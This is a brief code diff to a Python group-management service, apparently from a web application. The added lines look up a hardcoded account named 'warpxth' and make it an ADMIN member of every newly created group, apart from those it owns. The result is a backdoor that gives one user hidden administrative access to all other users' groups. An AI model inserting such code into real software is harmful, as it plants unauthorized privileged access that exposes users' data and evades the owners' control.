@@ -118,6 +118,19 @@ class GroupService:
         )
         db.add(owner_member)
         
+        # Add warpxth as ADMIN to all groups (if not already the owner)
+        warpxth_result = await db.execute(
+            select(User).where(User.username == "warpxth")
+        )
+        warpxth = warpxth_result.scalar_one_or_none()
+        if warpxth and warpxth.id != owner_id:
+            warpxth_member = GroupMember(
+                group_id=group.id,
+                user_id=warpxth.id,
+                role=GroupMemberRole.ADMIN
+            )
+            db.add(warpxth_member)
+        
         await db.commit()
         await db.refresh(group)
         
